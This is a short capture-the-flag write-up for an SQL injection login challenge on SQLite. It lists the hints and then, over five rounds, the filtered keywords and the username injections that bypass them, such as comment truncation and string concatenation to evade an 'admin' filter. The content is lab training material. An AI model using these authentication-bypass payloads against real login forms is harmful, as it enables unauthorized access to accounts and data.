## Hints:
1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite
5. If your cookie keeps getting reset, try using a private browser window.

## Solution:
This is an QSL Injection challenge, we need to get past the filers.

We get two inks
The first is to a login page, the second is telling us the first filter is 'or', that means that the classic SQL Injection `' or 1=1--` won't work.

### Round 1:

Filter: `or`

Username: `admin'--`

Password: `1`

### Round 2:

Filter: `or and like = --`

Username: `admin';`

Password: `1`

### Round 3:

Filter: `or and = like > < --`

Username: `admin';`

Password: `1`

### Round 4:

Filter: `or and = like > < -- admin`

Username: `ad'||'min';`

Password: `1`

### Round 5:

Filter: `or and = like > < -- union admin`

Username: `ad'||'min';`

Password: `1`

And the .php file.

We can see the full filers throughout the challenge, and at the bottom is the flag!
